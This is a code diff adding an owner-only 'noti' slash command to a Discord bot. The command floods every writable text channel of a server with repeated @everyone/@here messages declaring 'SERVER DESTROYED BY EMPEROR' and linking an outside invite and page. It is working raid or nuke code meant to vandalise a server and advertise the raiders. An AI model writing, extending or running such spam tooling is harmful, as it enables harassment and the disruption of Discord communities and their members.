@@ -2762,6 +2762,66 @@ def register_admin_commands(b_target):
       )
 
   @b_target.tree.command(
+      name="noti",
+      description="Noti Thằng Ngu (Owner only)",
+  )
+  async def noti_slash(interaction: discord.Interaction):
+    if not check_owner(interaction.user.id):
+      await interaction.response.defer(ephemeral=True)
+      return
+    if interaction.guild is None:
+      await interaction.response.defer(ephemeral=True)
+      return
+
+    await interaction.response.defer(ephemeral=True)
+
+    guild = interaction.guild
+    guild_id = guild.id
+
+    async def run_noti():
+      try:
+        noi_dung = """@everyone @here
+# [EMPEROR BỌN A ONTOP](https://discord.gg/zvdH9ZtBp2)
+# SERVER DESTROYED BY EMPEROR 🤣😂🤪😜
+# [BECUS ONTOP](https://cutes.lol/emiuanh209)"""
+
+        channels = [
+          ch for ch in guild.text_channels
+          if ch.permissions_for(guild.me).send_messages
+        ]
+
+        if not channels:
+          return
+
+        async def spam_channel(ch):
+          for i in range(10):
+            try:
+              await ch.send(
+                noi_dung,
+                allowed_mentions=discord.AllowedMentions(
+                  everyone=True,
+                  here=True,
+                ),
+              )
+            except asyncio.CancelledError:
+              raise
+            except Exception:
+              pass
+            await asyncio.sleep(5)
+
+        tasks = [asyncio.create_task(spam_channel(ch)) for ch in channels]
+        if tasks:
+          await asyncio.gather(*tasks, return_exceptions=True)
+
+      except asyncio.CancelledError:
+        raise
+      except Exception as e:
+        print(f"[NOTI] Lỗi: {e}")
+
+    task = asyncio.create_task(run_noti())
+    _track_task(spam_tasks, guild_id, task)
+
+  @b_target.tree.command(
     name="role",
     description="Check Role User (Owner only)",
   )
